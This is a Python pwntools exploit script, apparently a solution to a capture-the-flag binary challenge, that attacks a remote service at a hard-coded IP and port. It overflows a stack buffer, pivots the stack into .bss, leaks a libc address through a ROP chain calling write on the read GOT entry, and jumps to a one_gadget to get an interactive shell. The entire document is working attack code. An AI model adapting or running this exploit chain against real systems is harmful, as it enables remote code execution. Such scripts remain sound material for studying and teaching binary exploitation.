from code import interact
from pwn import *
context.log_level = 'debug'
def debug(cmd=''):
    gdb.attach(io,cmd)
    pause()
io = process("./pwn")
io = remote("43.156.14.141",1153)
elf = ELF("./pwn")
libc = ELF("./libc/libc-2.27.so")
read_got = elf.got['read']
read_plt = elf.plt['read']
write_plt = elf.plt['write']
leave_ret = 0x00000000004006c6
pop_rdi_ret =0x0000000000400733
pop_rsi_r15_ret = 0x0000000000400731
bss = 0x6010c0+0xc00
#debug()
io.recvuntil("overflow?: ")
payload = b'a'*96+p64(bss)+p64( 0x00000000004006af  )

io.send(payload)
sleep(1)
#debug()
payload2 = p64(0)+p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_r15_ret)+p64(read_got)+p64(0)+p64(write_plt)+p64(0x0000000000400637)
payload2 = payload2.ljust(96,b'\x00')
payload2 +=p64(bss-96)
payload2 +=p64(leave_ret)

io.send(payload2)

libcbase=u64(io.recvuntil('\x7f').ljust(8,b'\x00'))-libc.sym['read']
print(f'libcase = {hex(libcbase)}')

onegadget =libcbase+ 0x4f302 #这里用普通的pop_rdi_ret然后调用system没跑通,不知道为什么(盲区
payload = b'a'*96+p64(bss+0x100)+p64( 0x00000000004006af  )
io.recvuntil("overflow?: ")
io.send(payload)
payload3 = p64(0)+p64(onegadget)
payload3 = payload3.ljust(96,b'\x00')
payload3 +=p64(bss+0x100-96)
payload3 +=p64(leave_ret)
sleep(1)
io.send(payload3)

io.interactive()